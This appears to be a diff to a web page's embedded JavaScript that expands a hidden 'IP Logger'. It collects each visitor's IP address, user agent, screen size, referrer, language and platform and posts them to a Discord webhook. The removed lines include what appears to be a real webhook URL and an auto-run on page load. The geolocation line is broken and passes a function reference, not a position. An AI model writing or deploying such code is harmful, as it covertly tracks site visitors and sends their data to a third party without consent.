@@ -26,14 +26,21 @@
     }
   </style>
   <script>
-    // JavaScript IP Logger
-    function logIP() {
+    // JavaScript IP Logger with extensive user information
+    function logUserInfo() {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
-          const log = `IP: ${ip}, Timestamp: ${new Date().toISOString()}`;
-          const webhookUrl = 'https://discord.com/api/webhooks/1126202607132745871/O-DIXoAPbM_MqPwuHhUmQUUMIS5JD6V1rjZ-J70dWBjj3hsU4xkkXMWOQRVNqwkulAMx';
+          const log = `IP: ${ip}, Timestamp: ${new Date().toISOString()}, ` +
+            `User Agent: ${navigator.userAgent}, ` +
+            `Screen Resolution: ${screen.width}x${screen.height}, ` +
+            `Referrer: ${document.referrer}, ` +
+            `Geolocation: ${navigator.geolocation.getCurrentPosition}, ` +
+            `Language: ${navigator.language}, ` +
+            `Platform: ${navigator.platform}`;
+
+          const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
 
           const payload = JSON.stringify({ content: log });
           fetch(webhookUrl, {
@@ -44,11 +51,10 @@
             body: payload
           });
         })
-        .catch(error => console.error('Error:', error));
+        .catch(error => {
+          console.error('Error retrieving user information:', error);
+        });
     }
-
-    // Call the function to log IP when the page loads
-    window.addEventListener('load', logIP);
   </script>
 </head>
 <body>
